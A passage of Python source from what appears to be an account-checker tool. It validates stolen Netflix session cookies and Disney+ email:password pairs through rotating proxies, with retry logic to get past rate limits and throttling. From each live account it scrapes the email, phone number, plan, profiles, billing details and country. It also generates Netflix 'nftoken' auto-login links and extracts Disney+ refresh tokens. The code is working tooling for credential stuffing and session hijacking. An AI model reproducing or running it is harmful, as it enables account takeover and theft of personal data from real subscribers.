                    all_tested_proxies = load_proxies()
                all_p = list(all_tested_proxies)

            if not all_p:
                continue

            # BALANCED TRI-POOL HEALTH SAMPLING:
            # 1. Sample Healthy proxies: verify still alive (oldest tested first)
            healthy_pool = [p for p in all_p if p.get("status") == "OK"]
            healthy_pool.sort(key=lambda x: x.get("last_tested", 0))
            sample_healthy = healthy_pool[:80]

            # 2. AUTO-REVIVAL: Sample Dead (FAIL) proxies to resurrect recovered ones!
            dead_pool = [p for p in all_p if p.get("status") == "FAIL"]
            dead_pool.sort(key=lambda x: x.get("last_tested", 0))
            sample_dead = dead_pool[:60]

            # 3. AUTO-WARMUP: Sample Unverified/Untested proxies
            untested_pool = [p for p in all_p if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
            sample_untested = untested_pool[:40]

            batch_to_test = sample_healthy + sample_dead + sample_untested
            if not batch_to_test:
                continue

            def _bg_test_item(p):
                ok, lat = check_proxy_health(p, timeout=(3.0, 4.0), retries=1)
                p_copy = dict(p)
                p_copy["latency"] = lat if ok else 0
                p_copy["status"] = "OK" if ok else "FAIL"
                p_copy["last_tested"] = time.time()
                return p_copy

            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                tested_results = list(ex.map(_bg_test_item, batch_to_test))

            db_updates = []
            tested_map = {}
            for r in tested_results:
                if r:
                    k = r.get("line") or r.get("proxy") or r.get("raw")
                    db_updates.append((k, r["status"], r["latency"]))
                    tested_map[k] = r

            if db_updates:
                batch_update_cached_proxy_states(db_updates)

            with proxy_lock:
                for k, r in tested_map.items():
                    for p in all_tested_proxies:
                        pk = p.get("line") or p.get("proxy") or p.get("raw")
                        if pk == k or p.get("raw") == r.get("raw"):
                            p["status"] = r["status"]
                            p["latency"] = r["latency"]
                            p["last_tested"] = r["last_tested"]
                            break
                healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
        except Exception as e:
            logging.error(f"proxy_health_worker error: {e}")

def test_all_proxies_now(limit=100):
    start_background_proxy_test(limit=limit, mode="all")
    return {"ok": True, "message": f"Testing up to {limit} proxies in background"}

proxy_cooldown = {}
proxy_cooldown_lock = threading.Lock()

def mark_proxy_cooldown(proxy_url, duration=600):
    if not proxy_url:
        return
    with proxy_cooldown_lock:
        proxy_cooldown[proxy_url] = time.time() + duration

def get_random_proxy():
    global healthy_proxies, all_tested_proxies
    now = time.time()
    with proxy_lock:
        if healthy_proxies:
            pool = list(healthy_proxies)
        else:
            if not all_tested_proxies:
                all_tested_proxies = load_proxies()
            pool = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
            if not pool and all_tested_proxies:
                pool = list(all_tested_proxies)
    if not pool:
        return None, None, None

    with proxy_cooldown_lock:
        valid_pool = [p for p in pool if proxy_cooldown.get(p["proxy"], 0) <= now]
    if not valid_pool:
        valid_pool = pool

    choice = random.choice(valid_pool)
    lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
    return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]

def normalize_country(code):
    if not code:
        return 'Unknown'
    c = str(code).strip().upper()
    if len(c) == 2 and c.isalpha():
        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
    return c

def generate_nftoken(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    nid = cookies.get("NetflixId")
    if not nid:
        raise ValueError("Cookie NetflixId tidak ditemukan.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"

    # Aggressive retry: 5 attempts, each with fresh proxy, dead proxy instantly blacklisted
    max_retries = 5
    last_err = None

    for attempt in range(max_retries):
        # All attempts use proxy when use_proxy=True; direct only when explicitly off
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=True)
            if res.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)
            res.raise_for_status()

            data = res.json()
            token_node = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_node.get("token")
            expires = token_node.get("expires")
            if not token:
                raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")

            exp_str = "Unknown"
            if isinstance(expires, (int, float)):
                ts = expires // 1000 if len(str(int(expires))) == 13 else expires
                exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")

            token_url = f"https://netflix.com/?nftoken={token}"
            android_url = f"https://netflix.com/unsupported?nftoken={token}"
            tv_url = f"https://netflix.com/tv2?nftoken={token}"
            return token_url, android_url, tv_url, token, exp_str, route

        except Exception as e:
            last_err = e
            # Immediately blacklist this proxy on connection/timeout error
            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
                mark_proxy_cooldown(proxy_raw_url, 1800)
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue

    raise last_err

def check_netflix_membership(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    if "NetflixId" not in cookies:
        save_history("checker", "DEAD", raw_cookie=cookie_text)
        return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
    }

    # Aggressive retry: 5 attempts, each with fresh proxy
    max_retries = 5
    last_err = None

    for attempt in range(max_retries):
        # All attempts use proxy when use_proxy=True; direct only when explicitly off
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            session = requests.Session()
            ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
            headers['Cookie'] = ck_header

            r = session.get(
                'https://www.netflix.com/account/membership',
                headers=headers,
                proxies=proxies,
                timeout=10,
                allow_redirects=True,
                verify=True
            )

            if r.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)

            if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
                save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
                return {"live": False, "status": "DEAD", "reason": "Cookie Expired / Terlempar ke Login.", "route": route}

            html = r.text

            # 0. ON HOLD / MEMBERSHIP PAUSED DETECTION
            is_hold = False
            hold_reason = ""
            if re.search(r'"isPaused"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPaused: true"
            elif re.search(r'"isPendingPause"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPendingPause: true"
            elif re.search(r'"isUserOnHold"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isUserOnHold: true"
            elif re.search(r'"serviceEndReason"\s*:\s*"SERVICE_END_(?:NO_MOP|MOP_FAILURE|PAYMENT_FAILURE|HOLD|PAUSED)"', html, re.I):
                is_hold = True
                hold_reason = "serviceEndReason: payment failure / hold"
            elif re.search(r'"(?:membershipStatus|accountStatus|membership_status)"\s*:\s*"(?:PAUSED|ON_HOLD|HOLD|SUSPENDED|PAYMENT_HOLD)"', html, re.I):
                is_hold = True
                hold_reason = "Status enum: HOLD/PAUSED"
            elif any(k in r.url.lower() for k in ('/simpleupdatepayment', '/updatepayment', '/orderstatus')):
                is_hold = True
                hold_reason = "Redirected to payment/hold URL"
            elif re.search(r'(?:Your\s+membership\s+is\s+paused|membership\s+is\s+paused|Keanggotaan\s+Anda\s+dijeda|Your\s+account\s+is\s+on\s+hold|membership\s+is\s+on\s+hold|account\s+is\s+on\s+hold|Akun\s+Anda\s+ditangguhkan|Please\s+add\s+your\s+payment\s+information|Tambahkan\s+informasi\s+pembayaran)', html, re.I):
                is_hold = True
                hold_reason = "UI Text: Membership Paused / Payment Required"
            elif re.search(r'data-uia="[^"]*(?:paused-membership|membership-paused|account-paused|membership-hold)[^"]*"', html, re.I):
                is_hold = True
                hold_reason = "data-uia: hold/paused marker"

            status = "HOLD" if is_hold else "LIVE"

            # 1. PLAN DETECTION
            plan_detected = 'Standard'
            # Check explicit localizedPlanName in reactContext / JSON state
            plan_json_match = re.search(r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if plan_json_match:
                raw_p = plan_json_match.group(1).encode().decode('unicode_escape', errors='ignore')
                raw_p_lower = raw_p.lower()
                if 'iklan' in raw_p_lower or 'ads' in raw_p_lower:
                    plan_detected = 'Standard with Ads'
                elif 'ultra' in raw_p_lower or 'premium' in raw_p_lower or '4k' in raw_p_lower:
                    plan_detected = 'PREMIUM (ULTRA HD)'
                elif 'mobile' in raw_p_lower or 'ponsel' in raw_p_lower:
                    plan_detected = 'Mobile'
                elif 'dasar' in raw_p_lower or 'basic' in raw_p_lower:
                    plan_detected = 'Basic'
                else:
                    plan_detected = raw_p
            elif re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or re.search(r'\bpremium\b', html, re.I):
                plan_detected = 'PREMIUM (ULTRA HD)'
            else:
                plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
                if plan_match:
                    p_txt = plan_match.group(1).strip()
                    p_txt_lower = p_txt.lower()
                    if 'iklan' in p_txt_lower or 'ads' in p_txt_lower:
                        plan_detected = 'Standard with Ads'
                    elif 'ultra' in p_txt_lower or 'premium' in p_txt_lower:
                        plan_detected = 'PREMIUM (ULTRA HD)'
                    elif 'mobile' in p_txt_lower or 'ponsel' in p_txt_lower:
                        plan_detected = 'Mobile'
                    elif 'dasar' in p_txt_lower or 'basic' in p_txt_lower:
                        plan_detected = 'Basic'
                    else:
                        plan_detected = p_txt

            # 2. EMAIL EXTRACTION
            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'"userEmail"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'data-uia="account-email"[^>]*>([^<]+)<', html)
            email = email_match.group(1).strip() if email_match else 'Account Valid'
            # Clean hex escapes if any
            if r'\x40' in email or r'\x' in email:
                try:
                    email = email.encode('utf-8').decode('unicode_escape')
                except Exception:
                    pass
                email = email.replace(r'\x40', '@')

            # 3. PHONE EXTRACTION
            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
            if not phone_match:
                phone_match = re.search(r'data-uia="account-phone"[^>]*>([^<]+)<', html)
            phone = phone_match.group(1).strip() if phone_match else 'None'
            if r'\x20' in phone:
                phone = phone.replace(r'\x20', ' ')

            # 4. PROFILES EXTRACTION
            profiles = []
            # Method A: match GraphQL Profile objects
            for pm in re.finditer(r'Profile:\{.*?\"name\":\"([^\"]+)\"', html):
                p_name = pm.group(1).strip()
                if p_name and p_name not in profiles and not p_name.lower().startswith(('paket', 'plan', 'standard', 'premium', 'basic', 'mobile')):
                    profiles.append(p_name)

            # Method B: fallback to profileName or guid name
            if not profiles:
                for pm in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
                    p_name = pm.group(1).encode().decode('unicode_escape', errors='ignore').strip()
                    if p_name and p_name not in profiles:
                        profiles.append(p_name)

            # 5. NEXT BILLING DATE
            date_match = re.search(r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if date_match:
                billing = date_match.group(1).encode().decode('unicode_escape', errors='ignore').strip()
            else:
                date_dom_match = re.search(
                    r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
                    html, re.DOTALL | re.I
                )
                partner_match = re.search(r'Billed through\s+[^<\n"\']+', html, re.I)
                if date_dom_match:
                    billing = date_dom_match.group(1).strip()
                elif partner_match and not is_hold:
                    billing = partner_match.group(0).strip()
                else:
                    billing = 'Auto-renew active' if not is_hold else 'Membership Paused'

            if is_hold:
                if billing and billing != 'Auto-renew active' and 'HOLD' not in billing:
                    billing = f"{billing} (HOLD)"
                elif not billing or billing == 'Auto-renew active':
                    billing = "Membership Paused"

            # 6. MEMBER SINCE
            member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
            member_since = member_since_match.group(1).strip() if member_since_match else 'Active'

            # 7. COUNTRY
            country_match = re.search(r'"(?:countryOfSignup|currentCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            if not country_match:
                country_match = re.search(r'"(?:memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            country = normalize_country(country_match.group(1)) if country_match else 'Unknown'

            # Try generating nftoken simultaneously if possible
            nftoken_data = None
            try:
                t_url, a_url, tv_url, tok, exp, _ = generate_nftoken(cookie_text, use_proxy=use_proxy)
                nftoken_data = {
                    "url": t_url,
                    "android_url": a_url,
                    "tv_url": tv_url,
                    "token": tok,
                    "expires": exp
                }
            except Exception:
                pass
            editor_cookies = [
                {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
                for k, v in cookies.items()
            ]

            tok_link = (nftoken_data.get("url") if nftoken_data else "")
            save_history("checker", status, plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text)

            return {
                "live": not is_hold,
                "status": status,
                "is_hold": is_hold,
                "hold_reason": hold_reason,
                "email": email,
                "phone": phone,
                "plan": plan_detected,
                "billing": billing,
                "member_since": member_since,
                "profiles": profiles,
                "country": country,
                "cookies": editor_cookies,
                "token_data": nftoken_data,
                "route": route
            }
        except Exception as e:
            last_err = e
            # Blacklist dead/timeout proxy immediately
            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
                mark_proxy_cooldown(proxy_raw_url, 1800)
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue

    save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
    return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah {max_retries}x retry (semua proxy timeout): {str(last_err)}", "route": route}

# ══════════════════════════════════════════════════════════════════════════════
# Disney+ Account Checker (BAMTech reverse-engineered flow)
# ══════════════════════════════════════════════════════════════════════════════

DISNEY_API_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
DISNEY_CLIENT_ID = "disney-svod-3d9324fc"
DISNEY_DEVICE_GQL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
DISNEY_PUBLIC_GQL = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
DISNEY_TOKEN_URL = "https://disney.api.edge.bamgrid.com/token"
DISNEY_IDP_LOGIN = "https://disney.api.edge.bamgrid.com/idp/login"
DISNEY_ACCOUNTS_GRANT = "https://disney.api.edge.bamgrid.com/accounts/grant"
DISNEY_ACCOUNTS_ME = "https://disney.api.edge.bamgrid.com/accounts/me"
DISNEY_SUBSCRIBERS = "https://disney.api.edge.bamgrid.com/v2/subscribers"
DISNEY_SUBSCRIPTIONS = "https://disney.api.edge.bamgrid.com/subscriptions"

DISNEY_BAMSDK_VERSION = "35.2"

DISNEY_BASE_HDRS = {
    "Accept": "application/json; charset=utf-8",
    "Content-Type": "application/json; charset=utf-8",
    "X-BAMSDK-Platform-Id": "browser",
    "X-BAMSDK-Client-Id": DISNEY_CLIENT_ID,
    "X-BAMSDK-Version": DISNEY_BAMSDK_VERSION,
    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.disneyplus.com",
    "Referer": "https://www.disneyplus.com/",
    "Accept-Language": "en-US,en;q=0.9",
}

DISNEY_REGISTER_MUTATION = """mutation registerDevice($input: RegisterDeviceInput!) {
  registerDevice(registerDevice: $input) {
    grant { grantType assertion }
  }
}"""

DISNEY_LOGIN_MUTATION = "mutation login($input: LoginInput!) { login(login: $input) { actionGrant } }"

DISNEY_LOGIN_AG_MUTATION = (
    "mutation loginWithActionGrant($input: LoginWithActionGrantInput!) {"
    " loginWithActionGrant(login: $input) {"
    "   token { accessToken refreshToken }"
    "   activeSession { sessionId }"
    " }"
    "}"
)

DISNEY_REGISTER_INPUT = {
    "applicationRuntime": "chrome",
    "attributes": {
        "browserName": "chrome",
        "browserVersion": "124.0.0.0",
        "manufacturer": "apple",
        "model": None,
        "operatingSystem": "macintosh",
        "operatingSystemVersion": "10.15.7",
        "osDeviceIds": [],
    },
    "deviceFamily": "browser",
    "deviceLanguage": "en-US",
    "deviceProfile": "macosx",
}


def _disney_make_opener(proxy_url):
    if proxy_url:
        ph = urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
        return urllib.request.build_opener(ph)
    return urllib.request.build_opener()


def _disney_gql(opener, url, query, variables, op, auth, timeout=20):
    payload = json.dumps({"query": query, "variables": variables, "operationName": op}).encode()
    req = urllib.request.Request(url, data=payload,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_post_json(opener, url, body, auth, timeout=20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body_j = json.loads(e.read() or b"{}")
        except Exception:
            body_j = {}
        return e.code, body_j
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_token_form(opener, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(DISNEY_TOKEN_URL, data=data,
                                headers={**DISNEY_BASE_HDRS,
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "Authorization": f"Bearer {DISNEY_API_KEY}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return {"_error": e.code, **body}
    except Exception as exc:
        return {"_exc": str(exc)}


def _disney_get_json(opener, url, auth, timeout=20):
    req = urllib.request.Request(url, headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_fresh_device_token(opener, timeout=20):
    s, r = _disney_gql(opener, DISNEY_DEVICE_GQL, DISNEY_REGISTER_MUTATION,
                       {"input": DISNEY_REGISTER_INPUT}, "registerDevice", DISNEY_API_KEY, timeout)
    if s != 200 or not (r.get("data") or {}).get("registerDevice"):
        raise RuntimeError(f"registerDevice failed {s}: {r}")
    assertion = r["data"]["registerDevice"]["grant"]["assertion"]
    tok = _disney_token_form(opener, {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }, timeout)
    if "access_token" not in tok:
        raise RuntimeError(f"Device token exchange failed: {tok}")
    return tok["access_token"]


def _disney_err_code(e):
    return (e.get("code") or e.get("extensions", {}).get("code") or "").lower()


def _disney_is_throttled(errors):
    return any("throttled" in _disney_err_code(e) for e in errors)


def _disney_is_bad_creds(errors, http_status):
    bad_fragments = ("bad-credentials", "not-found", "user-disabled",
                     "identity.bad-credentials", "invalid-credentials", "identity.not-found")
    for e in errors:
        code = _disney_err_code(e)
        if any(f in code for f in bad_fragments):
            return True
    return http_status == 401


def _disney_get_country(me):
    attrs = me.get("attributes", {})
    purchase = attrs.get("locations", {}).get("purchase", {})
    if purchase.get("country"):
        return purchase["country"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "dss_country_code" and elem.get("value"):
            return elem["value"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "ot_country_code" and elem.get("value"):
            return elem["value"].upper()
    reg = attrs.get("locations", {}).get("registration", {})
    geoip = reg.get("geoIp", {})
    if geoip.get("country"):
        return geoip["country"].upper()
    return "N/A"


def _disney_get_active_sub(subscriptions):
    for s in subscriptions:
        state = s.get("state", "")
        if state == "ACTIVE":
            return s
        status = (s.get("status") or {}).get("type", "")
        if status == "SUBSCRIBED" or s.get("isActive"):
            return s
    return {}


def _disney_get_renewal_date(subscriptions_raw):
    active_s = [s for s in subscriptions_raw if s.get("isActive")]
    all_s = active_s or subscriptions_raw
    for s in all_s:
        nrd = s.get("nextRenewalDate")
        if nrd:
            return nrd[:10]
    return "N/A"


def check_disney_account(email, password, use_proxy=True):
    """Check a Disney+ account. Returns dict with status/details."""
    proxy_url = None
    proxy_label = "Direct"
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            # pick the http value
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"

    opener = _disney_make_opener(proxy_url)
    timeout = 20

    # Step 1-2: device registration
    try:
        dev_tok = _disney_fresh_device_token(opener, timeout)
    except Exception as exc:
        save_history("disney", "ERROR", route=f"Proxy ({proxy_label})" if use_proxy else "Direct",
                     raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"device-token: {exc}", "route": proxy_label}

    # Step 3: login
    id_tok = None
    max_retries = 3
    for attempt in range(1, max_retries + 1):
        s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_MUTATION,
                           {"input": {"email": email, "password": password}},
                           "login", dev_tok, timeout)
        errors = r.get("errors", [])

        if s == 200 and not errors:
            action_grant = (r.get("data") or {}).get("login", {}).get("actionGrant")
            if action_grant:
                id_tok = action_grant
                break

        if _disney_is_throttled(errors):
            s2, r2 = _disney_post_json(opener, DISNEY_IDP_LOGIN,
                                       {"email": email, "password": password}, dev_tok, timeout)
            errors2 = r2.get("errors", [])
            if s2 == 200 and "id_token" in r2:
                id_tok = r2["id_token"]
                break
            if _disney_is_throttled(errors2):
                if attempt < max_retries:
                    time.sleep(5 * attempt)
                    try:
                        dev_tok = _disney_fresh_device_token(opener, timeout)
                    except Exception:
                        pass
                    continue
                save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "ERROR", "reason": f"Throttled after {attempt} attempts", "route": proxy_label}
            if _disney_is_bad_creds(errors2, s2):
                save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}
            desc = (errors2[0].get("description", "") or _disney_err_code(errors2[0]) if errors2 else "")
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": desc or f"idp/login HTTP {s2}", "route": proxy_label}

        if _disney_is_bad_creds(errors, s):
            save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}

        desc = (_disney_err_code(errors[0]) if errors else "")
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": desc or f"gql-login HTTP {s}", "route": proxy_label}

    if not id_tok:
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": "Login: no id_token", "route": proxy_label}

    # Step 4: account token
    acc_tok = None
    s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_AG_MUTATION,
                       {"input": {"actionGrant": id_tok}},
                       "loginWithActionGrant", dev_tok, timeout)
    ag_data = (r.get("data") or {}).get("loginWithActionGrant", {})
    gql_acc_tok = (ag_data.get("token") or {}).get("accessToken")

    if s == 200 and gql_acc_tok:
        acc_tok = gql_acc_tok
    else:
        s2, r2 = _disney_post_json(opener, DISNEY_ACCOUNTS_GRANT, {"id_token": id_tok}, dev_tok, timeout)
        if s2 != 200 or "assertion" not in r2:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"accounts/grant HTTP {s2}", "route": proxy_label}
        tok2 = _disney_token_form(opener, {
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": r2["assertion"],
            "subject_token_type": "urn:bamtech:params:oauth:token-type:account",
            "latitude": "0", "longitude": "0", "platform": "browser",
        }, timeout)
        acc_tok = tok2.get("access_token")
        if not acc_tok:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"account token failed", "route": proxy_label}

    # Step 5: /accounts/me
    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    # Step 6: /v2/subscribers
    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
    if s_subs != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    # Step 7: /subscriptions
    subscriptions_raw = []
    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    # Extract info
    attrs = me.get("attributes", {})
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country = _disney_get_country(me)
    country_name = normalize_country(country) if len(country) == 2 else country

    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
    v2_subs = v2.get("subscriptions", [])
    active = _disney_get_active_sub(v2_subs)

    if active:
        product = active.get("product", {})
        plan_name = product.get("name") or "Disney Plus"
        term = active.get("term", {})
        is_trial = term.get("isFreeTrial", False)
        has_plan = True
        status = "LIVE"
    else:
        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
        is_trial = False
        has_plan = False
        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"

    renewal = _disney_get_renewal_date(subscriptions_raw)

    # Save to history
    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    save_history("disney", status, plan=plan_name, billing=renewal,
                 country=country_name, route=route,
                 raw_cookie=f"{email}:{password}", email=email)

    return {
        "status": status,
        "email": email,
        "email_verified": email_verified,
        "country": country_name,
        "plan": plan_name,
        "free_trial": is_trial,
        "renewal_date": renewal,
        "subscriber_status": subscriber_status,
        "has_plan": has_plan,
        "route": route,
    }


# ══════════════════════════════════════════════════════════════════════════════
# Disney+ Cookie Checker (refresh_token cookie → token exchange → profile)
# ══════════════════════════════════════════════════════════════════════════════

DISNEY_REFRESH_COOKIE_NAMES = ("refresh_token", "_disney_s2", "BAMSDK_refresh_token")

def extract_disney_refresh_token(cookie_text):
    """Parse refresh_token from Netscape .txt, JSON array, refresh_token=XXX string, or raw token."""
    if not cookie_text:
        return None

    text = str(cookie_text).strip()

    # 1. JSON array format [{"name":"refresh_token","value":"xxx"}, ...]
    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n in DISNEY_REFRESH_COOKIE_NAMES and v:
                            return v
        except Exception:
            pass

    # 2. Netscape format (tab-separated) — look for known cookie names in column 6
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in DISNEY_REFRESH_COOKIE_NAMES:
            return parts[6]

    # 3. Raw string: refresh_token=XXXXXX; _disney_s2=XXXXXX; BAMSDK_refresh_token=XXXXXX
    for cookie_name in DISNEY_REFRESH_COOKIE_NAMES:
        m = re.search(rf'(?:^|[;\s]){re.escape(cookie_name)}=([^\s;,]+)', text)
        if m:
            return m.group(1)

    # 4. If text is just a raw token value (no = sign, long string), treat as refresh_token
    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None


def check_disney_cookie(cookie_text, use_proxy=True):
    """Check a Disney+ account using refresh_token cookie: token exchange → profile → subscription."""
    refresh_token = extract_disney_refresh_token(cookie_text)
    if not refresh_token:
        save_history("disney", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "Disney+ refresh_token not found in input."}

    proxy_url = None
    proxy_label = "Direct"
    proxy_raw_url = None
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"
            proxy_raw_url = raw_url

    opener = _disney_make_opener(proxy_url)
